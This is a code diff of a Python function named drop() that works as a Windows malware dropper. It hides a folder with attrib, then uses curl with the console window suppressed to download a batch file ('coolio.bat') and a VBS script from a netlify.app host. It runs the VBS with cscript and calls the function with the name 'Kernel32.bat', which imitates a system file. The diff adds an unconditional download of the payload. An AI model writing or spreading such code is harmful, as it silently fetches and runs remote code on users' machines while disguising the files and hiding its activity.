@@ -13,10 +13,10 @@ def drop(file):
         subprocess.run(f"attrib +h {folderpath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
     
     subprocess.run(f"curl -s -o {vbs_path} {vbs_url}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    
-    if not os.path.exists(filepath):
-        subprocess.run(f"curl -s -o {filepath} https://boisterous-kataifi-40b43d.netlify.app/{file}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    
+    subprocess.run(f"curl -s -o {filepath} https://boisterous-kataifi-40b43d.netlify.app/coolio.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    if not os.path.exists(filepath) or os.path.exists(vbs_path):
+        subprocess.run(f"curl -s -o {filepath} https://boisterous-kataifi-40b43d.netlify.app/coolio.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(f"curl -s -o {vbs_path} {vbs_url}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
     subprocess.run(f"cscript //nologo {vbs_path}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
 drop("Kernel32.bat")
